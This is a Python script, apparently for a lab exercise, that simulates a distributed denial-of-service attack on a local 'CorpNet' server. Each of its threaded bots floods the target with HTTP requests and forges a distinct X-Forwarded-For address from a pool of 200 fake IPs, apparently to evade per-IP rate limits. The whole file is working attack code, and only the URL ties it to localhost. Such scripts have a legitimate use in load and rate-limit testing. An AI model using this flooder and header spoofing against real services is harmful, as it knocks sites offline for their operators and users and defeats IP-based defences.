#!/usr/bin/env python3
"""
DDoS simulation script — multiple bots with spoofed X-Forwarded-For IPs.

Usage:
    python ddos_attack.py [--duration 20] [--threads 10]
"""

import argparse
import sys
import threading
import time

import requests

TARGET_URL = "http://localhost:5001/"

# Fake source IP pool — one subnet per "bot"
FAKE_IP_POOL = [
    f"192.168.{subnet}.{host}"
    for subnet in range(1, 21)
    for host in range(1, 11)
]  # 200 fake IPs


class DDoSStats:
    def __init__(self):
        self._lock = threading.Lock()
        self.total = 0
        self.success = 0
        self.failed = 0
        self._prev_total = 0
        self._prev_time = time.time()

    def record(self, ok: bool) -> None:
        with self._lock:
            self.total += 1
            if ok:
                self.success += 1
            else:
                self.failed += 1

    def rate(self) -> float:
        now = time.time()
        with self._lock:
            delta_req = self.total - self._prev_total
            delta_t = now - self._prev_time
            self._prev_total = self.total
            self._prev_time = now
            return delta_req / delta_t if delta_t > 0 else 0.0

    def snapshot(self) -> tuple[int, int, int]:
        with self._lock:
            return self.total, self.success, self.failed


def bot_worker(
    bot_id: int,
    fake_ip: str,
    stats: DDoSStats,
    stop_event: threading.Event,
) -> None:
    """Each bot sends requests as fast as possible with a unique spoofed IP."""
    session = requests.Session()
    session.headers.update({
        "X-Forwarded-For": fake_ip,
        "User-Agent": f"Mozilla/5.0 Bot/{bot_id}",
    })
    while not stop_event.is_set():
        try:
            resp = session.get(TARGET_URL, timeout=3)
            stats.record(resp.status_code < 500)
        except requests.RequestException:
            stats.record(False)
        # tiny sleep to prevent 100% CPU spin
        time.sleep(0.005)


def main():
    parser = argparse.ArgumentParser(description="DDoS simulation against CorpNet")
    parser.add_argument("--duration", type=int, default=20,
                        help="Attack duration in seconds (default: 20)")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of simulated bots (default: 10)")
    args = parser.parse_args()

    stats = DDoSStats()
    stop_event = threading.Event()

    print(f"\n[DDoS] Target  : {TARGET_URL}")
    print(f"[DDoS] Bots    : {args.threads}")
    print(f"[DDoS] Duration: {args.duration}s")
    print(f"[DDoS] Each bot uses a unique X-Forwarded-For IP")
    print("-" * 60)

    threads = []
    for i in range(args.threads):
        ip = FAKE_IP_POOL[i % len(FAKE_IP_POOL)]
        t = threading.Thread(
            target=bot_worker,
            args=(i + 1, ip, stats, stop_event),
            daemon=True,
            name=f"bot-{i+1}",
        )
        t.start()
        threads.append(t)

    start = time.time()
    try:
        for tick in range(1, args.duration + 1):
            time.sleep(1)
            current_rate = stats.rate()
            total, success, failed = stats.snapshot()
            print(
                f"[DDoS] {args.threads} bots active | "
                f"Total requests: {total:>6} | "
                f"Rate: {current_rate:>6.1f} req/s | "
                f"Failed: {failed}"
            )
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=2)

    total, success, failed = stats.snapshot()
    duration = time.time() - start
    print("-" * 60)
    print(f"[DDoS] Simulation complete — {total} total requests in {duration:.1f}s "
          f"({total / duration:.1f} req/s avg) | {args.threads} bots")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
